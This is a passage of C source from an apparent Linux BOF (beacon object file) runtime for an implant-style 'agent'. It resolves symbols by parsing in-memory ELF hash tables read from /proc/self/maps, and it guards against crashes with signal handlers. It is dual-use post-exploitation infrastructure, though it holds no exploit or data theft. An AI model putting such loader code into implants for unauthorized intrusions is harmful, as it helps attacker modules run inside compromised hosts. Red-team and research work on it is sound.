 * OJO: el orden importa. /usr/lib64/ NO empieza por /usr/lib/ porque
 * el carácter 9 es '6', no '/'. Idem /lib64/ vs /lib/. */
static int _is_system_lib_path(const char *path) {
    if (!path) return 0;

    if (strncmp(path, "/usr/lib/",        9) == 0) return 1;
    if (strncmp(path, "/usr/lib64/",     10) == 0) return 1;
    if (strncmp(path, "/lib/",            5) == 0) return 1;
    if (strncmp(path, "/lib64/",          7) == 0) return 1;
    if (strncmp(path, "/usr/local/lib/", 15) == 0) return 1;

    return 0;
}

/* ── Signal guard ────────────────────────────────────────────────────────
 *
 * A malformed or partially-unmapped DSO can make _resolve_from_lib read
 * out of bounds and raise SIGSEGV/SIGBUS. The guard catches those two
 * signals on the calling thread and turns them into a NULL return so the
 * resolver can skip the broken DSO instead of killing the process.
 *
 * Design:
 *   - If the host process already installs its own handler for
 *     SIGSEGV/SIGBUS (Firefox for wasm traps, Python for faulthandler,
 *     V8/Node for JIT, Java for its own traps, ...), we DO NOT install
 *     our handler. Overwriting theirs breaks their control flow and
 *     crashes the host at the next legitimate trap. Instead, we set
 *     _resolve_guard_available = 0 and perform resolution unprotected;
 *     the host's handler catches anything our resolver trips.
 *   - If the host has no handler (SIG_DFL / SIG_IGN), we install ours
 *     with SA_SIGINFO so that if anything else installs a handler
 *     later, we can delegate to it with the original siginfo and
 *     ucontext.
 *   - The handler is installed exactly once (pthread_once) and never
 *     uninstalled.
 *   - The jmp_buf and the "am I inside the guard?" flag are thread-local.
 *   - SA_NODEFER is NOT set: sigsetjmp/siglongjmp save and restore the
 *     signal mask. */

static __thread sigjmp_buf            _resolve_jmpbuf;
static __thread volatile sig_atomic_t _resolve_guard_active = 0;
static struct sigaction               _resolve_old_sigsegv;
static struct sigaction               _resolve_old_sigbus;
static pthread_once_t                 _guard_once = PTHREAD_ONCE_INIT;
static volatile int                   _resolve_guard_available = 0;

/* Forward declaration: defined below. */
static void *_resolve_from_lib(unsigned char *base, const char *name);

/* Returns 1 if the host process already has a non-default handler
 * installed for `sig`. Handles both sa_handler and SA_SIGINFO styles. */
static int _host_has_own_handler(int sig) {
    struct sigaction cur;
    if (sigaction(sig, NULL, &cur) != 0) return 0;
    if (cur.sa_handler == SIG_DFL) return 0;
    if (cur.sa_handler == SIG_IGN) return 0;
    if (cur.sa_flags & SA_SIGINFO) {
        return cur.sa_sigaction != NULL;
    }
    return cur.sa_handler != NULL;
}

/* Handler used when we own the signal. On a fault from our own
 * _safe_resolve_from_lib (guard active), siglongjmp out. Otherwise
 * delegate to the previous handler with the original siginfo and
 * ucontext. If the previous handler was SIG_DFL, restore and re-raise
 * so the kernel's default action happens as intended. */
static void _resolve_signal_handler(int sig, siginfo_t *info, void *ucontext) {
    if (_resolve_guard_active)
        siglongjmp(_resolve_jmpbuf, 1);

    const struct sigaction *prev = (sig == SIGSEGV)
                                   ? &_resolve_old_sigsegv
                                   : &_resolve_old_sigbus;

    if (prev->sa_flags & SA_SIGINFO) {
        if (prev->sa_sigaction) {
            prev->sa_sigaction(sig, info, ucontext);
            return;
        }
    } else {
        if (prev->sa_handler == SIG_IGN) return;
        if (prev->sa_handler != SIG_DFL && prev->sa_handler != NULL) {
            prev->sa_handler(sig);
            return;
        }
    }
    /* Old handler was SIG_DFL. Restore and re-raise. */
    struct sigaction dfl;
    memset(&dfl, 0, sizeof(dfl));
    dfl.sa_handler = SIG_DFL;
    sigemptyset(&dfl.sa_mask);
    sigaction(sig, &dfl, NULL);
    raise(sig);
}

static void _install_guard_once(void) {
    /* Respect existing handlers. Firefox (wasm traps), Python
     * (faulthandler), V8/Node (JIT), and Java (JNI) all install
     * SIGSEGV handlers for their own control flow; overwriting them
     * breaks that flow and crashes the host at the next legitimate
     * trap. */
    if (_host_has_own_handler(SIGSEGV) || _host_has_own_handler(SIGBUS)) {
        _resolve_guard_available = 0;
        return;
    }

    struct sigaction sa;
    memset(&sa, 0, sizeof(sa));
    sa.sa_sigaction = _resolve_signal_handler;
    sa.sa_flags     = SA_SIGINFO;   /* chain siginfo to any future handler */
    sigemptyset(&sa.sa_mask);
    sigaction(SIGSEGV, &sa, &_resolve_old_sigsegv);
    sigaction(SIGBUS,  &sa, &_resolve_old_sigbus);
    _resolve_guard_available = 1;
}

static void _install_resolve_guard(void) {
    pthread_once(&_guard_once, _install_guard_once);
}

/* Run _resolve_from_lib under the guard. Returns NULL on SIGSEGV/SIGBUS
 * if the guard is available. If not (host owns the signals), runs
 * unprotected — the host's own handler catches anything we trip. */
static void *_safe_resolve_from_lib(unsigned char *base, const char *name) {
    if (!_resolve_guard_available) {
        return _resolve_from_lib(base, name);
    }
    _resolve_guard_active = 1;
    if (sigsetjmp(_resolve_jmpbuf, 1) != 0) {
        _resolve_guard_active = 0;
        return NULL;                    /* DSO corrupted — skip it */
    }
    void *result = _resolve_from_lib(base, name);
    _resolve_guard_active = 0;
    return result;
}

/* ── Parser /proc/self/maps ────────────────────────────────────────────── */

/* Actual cache-filling routine. Assumes _lib_mutex is held.
 * Returns the number of new entries added. */
static int _scan_libraries_locked(void) {
    int added = 0;

    int fd = open("/proc/self/maps", O_RDONLY);
    if (fd < 0) return 0;

    char buf[256];
    char line[512];
    int  line_len = 0;
    int  n;

    while ((n = (int)read(fd, buf, sizeof(buf))) > 0) {
        for (int i = 0; i < n; i++) {
            if (buf[i] == '\n' || line_len >= (int)sizeof(line) - 1) {
                line[line_len] = '\0';

                {
                    char *p = line;

                    while (*p && *p != ' ') p++;
                    if (!*p) goto next_line;
                    p++;

                    while (*p && *p != ' ') p++;
                    if (!*p) goto next_line;
                    p++;

                    unsigned long offset = 0;
                    while (*p && *p != ' ') {
                        unsigned int digit;
                        if (*p >= '0' && *p <= '9') digit = *p - '0';
                        else if (*p >= 'a' && *p <= 'f') digit = *p - 'a' + 10;
                        else break;
                        offset = (offset << 4) | digit;
                        p++;
                    }
                    if (offset != 0) goto next_line;

                    const char *path = NULL;
                    while (*p) {
                        if (*p == '/') { path = p; break; }
                        p++;
                    }
                    if (!path) goto next_line;

                    if (!_is_system_lib_path(path)) goto next_line;

                    {
                        int is_so = 0;
                        for (const char *q = path; q[0] && q[1] && q[2]; q++) {
                            if (q[0] == '.' && q[1] == 's' && q[2] == 'o') {
                                is_so = 1;
                                break;
                            }
                        }
                        if (!is_so) goto next_line;
                    }

                    unsigned long addr = 0;
                    p = line;
                    while (*p && *p != '-') {
                        unsigned int digit;
                        if (*p >= '0' && *p <= '9') digit = *p - '0';
                        else if (*p >= 'a' && *p <= 'f') digit = *p - 'a' + 10;
                        else break;
                        addr = (addr << 4) | digit;
                        p++;
                    }

                    unsigned char *check = (unsigned char *)addr;
                    if (!_is_valid_elf64_dso(check)) goto next_line;

                    int dup = 0;
                    for (int j = 0; j < _lib_cache_count; j++) {
                        if (_lib_cache[j].base == addr) { dup = 1; break; }
                    }
                    if (dup) goto next_line;

                    /* Crecimiento dinámico: dobla cuando hace falta.
                     * Sin límite artificial: si realloc falla, se salta
                     * este candidato pero se sigue con los demás. */
                    if (_lib_cache_count >= _lib_cache_cap) {
                        int new_cap = _lib_cache_cap ? _lib_cache_cap * 2 : 16;
                        _lib_entry *np = realloc(_lib_cache,
                                                 (size_t)new_cap * sizeof(_lib_entry));
                        if (!np) goto next_line;
                        _lib_cache     = np;
                        _lib_cache_cap = new_cap;
                    }

                    _lib_entry *e = &_lib_cache[_lib_cache_count];
                    e->base = addr;
                    e->name[0] = '\0';
                    const char *sl = path;
                    for (const char *q = path; *q; q++)
                        if (*q == '/') sl = q + 1;
                    int ni = 0;
                    while (ni < 47 && sl[ni] &&
                           sl[ni] != '.' && sl[ni] != '-') {
                        e->name[ni] = sl[ni];
                        ni++;
                    }
                    e->name[ni] = '\0';
                    _lib_cache_count++;
                    added++;
                }

            next_line:
                line_len = 0;
            } else {
                line[line_len++] = buf[i];
            }
        }
    }
    close(fd);

    /* Mueve libc a índice 0 para orden determinista en RTLD$ / LIBC$.
     * Se hace cada vez, porque un rescan puede añadir libc si no estaba. */
    for (int i = 1; i < _lib_cache_count; i++) {
        if (strcmp(_lib_cache[i].name, "libc") == 0) {
            _lib_entry tmp = _lib_cache[0];
            _lib_cache[0] = _lib_cache[i];
            _lib_cache[i] = tmp;
            break;
        }
    }

    return added;
}

/* One-shot initial scan. Runs exactly once thanks to pthread_once.
 * Takes the mutex because _scan_libraries_locked assumes it. */
static void _scan_libraries_impl(void) {
    pthread_mutex_lock(&_lib_mutex);
    _scan_libraries_locked();
    pthread_mutex_unlock(&_lib_mutex);
}

static void _scan_libraries(void) {
    pthread_once(&_lib_once, _scan_libraries_impl);
}

/* Re-scan /proc/self/maps for DSOs loaded after the initial scan.
 * Thread-safe: takes the same mutex as everything else. */
static int _rescan_libraries(void) {
    pthread_mutex_lock(&_lib_mutex);
    int added = _scan_libraries_locked();
    pthread_mutex_unlock(&_lib_mutex);
    return added;
}

/* Take a snapshot of the current base addresses. Returns a malloc'd
 * array of `count` entries, or NULL on empty cache / allocation failure.
 * If out_names is non-NULL, also copies the short names. Caller frees. */
static unsigned long *_snapshot_bases_locked(int *out_count,
                                             char (*out_names)[48]) {
    pthread_mutex_lock(&_lib_mutex);
    int n = _lib_cache_count;
    unsigned long *bases = NULL;
    if (n > 0) {
        bases = malloc((size_t)n * sizeof(unsigned long));
        if (bases && out_names) {
            for (int i = 0; i < n; i++) {
                memcpy(out_names[i], _lib_cache[i].name, 48);
            }
        }
        if (bases) {
            for (int i = 0; i < n; i++) bases[i] = _lib_cache[i].base;
        }
    }
    pthread_mutex_unlock(&_lib_mutex);
    *out_count = n;
    return bases;
}

/* ── Resolucion de un simbolo en una DSO concreta ── */

static void *_resolve_from_lib(unsigned char *base, const char *name) {
    if (!base || !name) return NULL;

    _Ehdr64 *eh = (_Ehdr64 *)base;

    if (eh->e_phnum == 0 || eh->e_phentsize != sizeof(_Phdr64))
        return NULL;

    _Phdr64 *phdrs = (_Phdr64 *)(base + eh->e_phoff);

    if (!_addr_in_load_segments((uint64_t)phdrs, (uint64_t)base, eh, phdrs))
        return NULL;

    /* load_bias desde el PT_LOAD con p_offset == 0 */
    uint64_t load_bias = (uint64_t)base;
    int found_ptload = 0;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (phdrs[i].p_type == PT_LOAD && phdrs[i].p_offset == 0) {
            load_bias = (uint64_t)base - phdrs[i].p_vaddr;
            found_ptload = 1;
            break;
        }
    }
    if (!found_ptload) return NULL;

    _Dyn64 *dyn = NULL;
    for (int i = 0; i < eh->e_phnum; i++) {
        if (phdrs[i].p_type == PT_DYNAMIC) {
            dyn = (_Dyn64 *)(load_bias + phdrs[i].p_vaddr);
            break;
        }
    }
    if (!dyn) return NULL;
    if (!_addr_in_load_segments((uint64_t)dyn, load_bias, eh, phdrs))
        return NULL;

    uint64_t raw_symtab    = 0;
    uint64_t raw_strtab    = 0;
    uint64_t raw_gnu_hash  = 0;
    uint64_t raw_sysv_hash = 0;

    for (_Dyn64 *d = dyn; d->d_tag != DT_NULL; d++) {
        switch (d->d_tag) {
        case DT_SYMTAB:   raw_symtab    = d->d_un.d_ptr; break;
        case DT_STRTAB:   raw_strtab    = d->d_un.d_ptr; break;
        case DT_GNU_HASH: raw_gnu_hash  = d->d_un.d_ptr; break;
        case DT_HASH:     raw_sysv_hash = d->d_un.d_ptr; break;
        }
    }
    if (!raw_symtab || !raw_strtab) return NULL;
    if (!raw_gnu_hash && !raw_sysv_hash) return NULL;

    uint64_t symtab_addr    = _resolve_dptr(raw_symtab,    load_bias, eh, phdrs);
    uint64_t strtab_addr    = _resolve_dptr(raw_strtab,    load_bias, eh, phdrs);
    uint64_t gnu_hash_addr  = raw_gnu_hash
                              ? _resolve_dptr(raw_gnu_hash,  load_bias, eh, phdrs)
                              : 0;
    uint64_t sysv_hash_addr = raw_sysv_hash
                              ? _resolve_dptr(raw_sysv_hash, load_bias, eh, phdrs)
                              : 0;

    if (!symtab_addr || !strtab_addr) return NULL;
    if (!gnu_hash_addr && !sysv_hash_addr) return NULL;

    /* Validación dura: todos los punteros del .dynamic deben estar en PT_LOAD */
    if (!_addr_in_load_segments(symtab_addr, load_bias, eh, phdrs)) return NULL;
    if (!_addr_in_load_segments(strtab_addr, load_bias, eh, phdrs)) return NULL;
    if (gnu_hash_addr  && !_addr_in_load_segments(gnu_hash_addr,  load_bias, eh, phdrs)) return NULL;
    if (sysv_hash_addr && !_addr_in_load_segments(sysv_hash_addr, load_bias, eh, phdrs)) return NULL;

    _Sym64     *symtab = (_Sym64 *)symtab_addr;
    const char *strtab = (const char *)strtab_addr;

    uint64_t strtab_avail = _bytes_to_segment_end(strtab_addr, load_bias, eh, phdrs);
    if (strtab_avail == 0) return NULL;

    uint32_t target_hash = _djb2(name);

    /* GNU hash (preferido) */
    if (gnu_hash_addr) {
        uint32_t *gnu_hash = (uint32_t *)gnu_hash_addr;

        uint32_t nbuckets    = gnu_hash[0];
        uint32_t symoffset   = gnu_hash[1];
        uint32_t bloom_size  = gnu_hash[2];
        uint32_t bloom_shift = gnu_hash[3];

        if (nbuckets && bloom_size) {
            bloom_shift &= 31;

            uint64_t *bloom   = (uint64_t *)(gnu_hash + 4);
            uint32_t *buckets = (uint32_t *)(bloom + bloom_size);
            uint32_t *chain   = buckets + nbuckets;

            if (!_addr_in_load_segments((uint64_t)bloom,   load_bias, eh, phdrs)) return NULL;
            if (!_addr_in_load_segments((uint64_t)buckets, load_bias, eh, phdrs)) return NULL;
            if (!_addr_in_load_segments((uint64_t)chain,   load_bias, eh, phdrs)) return NULL;

            uint64_t word = bloom[(target_hash / 64) % bloom_size];
            uint64_t mask = (1ULL << (target_hash % 64)) |
                            (1ULL << ((target_hash >> bloom_shift) % 64));

            if ((word & mask) == mask) {
                uint32_t idx = buckets[target_hash % nbuckets];

                if (idx >= symoffset) {
                    uint32_t iter = 0;
                    for (;; idx++) {
                        if (iter++ > 0x100000) return NULL;

                        uint32_t hh = chain[idx - symoffset];
                        if ((hh | 1) == (target_hash | 1)) {
                            _Sym64 *sym = &symtab[idx];

                            if (!_addr_in_load_segments((uint64_t)sym, load_bias, eh, phdrs))
                                return NULL;

                            if (sym->st_value &&
                                sym->st_shndx != SHN_UNDEF &&
                                sym->st_name < strtab_avail) {

                                uint64_t sym_avail = strtab_avail - sym->st_name;
                                const char *sym_name = strtab + sym->st_name;

                                if (_safe_str_eq(sym_name, name, sym_avail, 256)) {
                                    if (sym->st_shndx == SHN_ABS)
                                        return (void *)(uint64_t)sym->st_value;
                                    return (void *)(load_bias + (uint64_t)sym->st_value);
                                }
                            }
                        }
                        if (hh & 1) break;
                    }
                }
            }
        }
    }

    /* SysV hash (fallback) */
    if (sysv_hash_addr) {
        uint32_t *sysv = (uint32_t *)sysv_hash_addr;
        uint32_t nbucket = sysv[0];
        uint32_t nchain  = sysv[1];
        if (nbucket && nchain) {
            uint32_t *bucket = sysv + 2;
            uint32_t *chain  = bucket + nbucket;

            if (!_addr_in_load_segments((uint64_t)bucket, load_bias, eh, phdrs)) return NULL;
            if (!_addr_in_load_segments((uint64_t)chain,  load_bias, eh, phdrs)) return NULL;

            uint32_t h   = _sysv_hash(name);
            uint32_t idx = bucket[h % nbucket];

            uint32_t hops = 0;
            while (idx != 0 && idx < nchain && hops++ < nchain) {
                _Sym64 *sym = &symtab[idx];

                if (!_addr_in_load_segments((uint64_t)sym, load_bias, eh, phdrs))
                    return NULL;

                if (sym->st_value &&
                    sym->st_shndx != SHN_UNDEF &&
                    sym->st_name < strtab_avail) {

                    uint64_t sym_avail = strtab_avail - sym->st_name;
                    const char *sym_name = strtab + sym->st_name;

                    if (_safe_str_eq(sym_name, name, sym_avail, 256)) {
                        if (sym->st_shndx == SHN_ABS)
                            return (void *)(uint64_t)sym->st_value;
                        return (void *)(load_bias + (uint64_t)sym->st_value);
                    }
                }
                idx = chain[idx];
            }
        }
    }

    return NULL;
}

/* ── Búsquedas sobre el snapshot ──────────────────────────────────────── */

/* Resolve `name` against every loaded DSO. Takes a snapshot of bases
 * under the mutex, then parses DSOs outside the mutex so a signal
 * guard trip cannot leave _lib_mutex held. */
static void *_resolve_from_any_lib(const char *name) {
    _scan_libraries();
    _install_resolve_guard();

    int n = 0;
    unsigned long *bases = _snapshot_bases_locked(&n, NULL);
    if (!bases || n == 0) { free(bases); return NULL; }

    void *result = NULL;
    for (int i = 0; i < n; i++) {
        void *addr = _safe_resolve_from_lib((unsigned char *)bases[i], name);
        if (addr) { result = addr; break; }
    }
    free(bases);
    return result;
}

/* ── Public helpers for bof_deps.c ── */

/* Re-scan /proc/self/maps and register any DSO not yet in the cache.
 * Called after dlopen so the new DSO becomes resolvable. Idempotent:
 * entries already in the cache are skipped by the base-address dedupe.
 * Thread-safe: serialized by _lib_mutex. */
void bof_lib_rescan(void) {
    pthread_mutex_lock(&_lib_mutex);
    _scan_libraries_locked();
    pthread_mutex_unlock(&_lib_mutex);
}

/* Look up a library by its short name ("libc", "libz", "libcrypto", ...).
 * Returns 1 and writes *out_base on hit, 0 on miss. Thread-safe. */
int bof_lib_find(const char *hint, unsigned long *out_base) {
    if (!hint || !out_base) return 0;
    *out_base = 0;
    _scan_libraries();                     /* ensure initial scan happened */

    pthread_mutex_lock(&_lib_mutex);
    int found = 0;
    for (int i = 0; i < _lib_cache_count; i++) {
        if (strcmp(_lib_cache[i].name, hint) == 0) {
            *out_base = _lib_cache[i].base;
            found = 1;
            break;
        }
    }
    pthread_mutex_unlock(&_lib_mutex);
    return found;
}

/* Forward declaration implemented in nax_bof_sdk.c */
void *nax_bof_resolve_custom(const char *name);

/* ── Resolver publico ── */

void *bof_resolve_symbol(const char *name) {
    if (!name) return NULL;

    /* Layer 1: Custom symbols */
    void *custom = nax_bof_resolve_custom(name);
    if (custom) return custom;

    /* Layer 2: Base SDK table */
    for (int i = 0; bof_api_table[i].name; i++)
        if (strcmp(name, bof_api_table[i].name) == 0)
            return bof_api_table[i].func;

    /* Layer 3: Runtime resolution from loaded DSOs.
     *
     *   LIBXXX$func  -> busca en la DSO cuyo nombre corto sea "libxxx"
     *   RTLD$func    -> busca en cualquier DSO cargada
     *   LIBC$func    -> alias de RTLD$ (con libc primero en el cache)
     *
     * Fallback policy:
     *   - If the hint is in the cache, resolve strictly against that DSO.
     *     No cross-library fallback: a BOF that asked for LIBZ$foo must
     *     get libz's foo, never some unrelated DSO's foo.
     *   - If the hint is not in the cache, first force a rescan (covers
     *     dlopen done by other parts of the agent), then fall back to a
     *     global search. This covers libpthread-after-merge (glibc >=
     *     2.34) and any DSO loaded after our last scan. */
    const char *dollar = strchr(name, '$');
    if (dollar && dollar != name) {
        const char *func_name = dollar + 1;
        int prefix_len = (int)(dollar - name);

        /* Normaliza prefijo a minusculas: LIBZ -> libz */
        char lib_hint[48] = {0};
        if (prefix_len < (int)sizeof(lib_hint)) {
            for (int i = 0; i < prefix_len; i++)
                lib_hint[i] = (name[i] >= 'A' && name[i] <= 'Z')
                            ? name[i] + 32 : name[i];
        }

        _scan_libraries();

        if (strcmp(lib_hint, "rtld") == 0 || strcmp(lib_hint, "libc") == 0) {
            /* RTLD$ and LIBC$ genuinely span multiple DSOs:
             *   - RTLD$ is "search every loaded DSO".
             *   - LIBC$ must cover libpthread/libdl/librt, all merged
             *     into libc on glibc >= 2.34. */
            return _resolve_from_any_lib(func_name);
        }

        /* Strict path: look only in the hinted DSO. */
        unsigned long base = 0;
        if (bof_lib_find(lib_hint, &base)) {
            _install_resolve_guard();
            return _safe_resolve_from_lib((unsigned char *)base, func_name);
        }

        /* Hint not present. Try a rescan once (covers dlopen by other
         * parts of the agent), then fall back to global search. */
        if (_rescan_libraries() > 0) {
            if (bof_lib_find(lib_hint, &base)) {
                _install_resolve_guard();
                return _safe_resolve_from_lib((unsigned char *)base, func_name);
            }
        }

        /* Final fallback: global search. Reached only when the hint is
         * unknown to the cache. */
        return _resolve_from_any_lib(func_name);
    }

    return NULL;
}
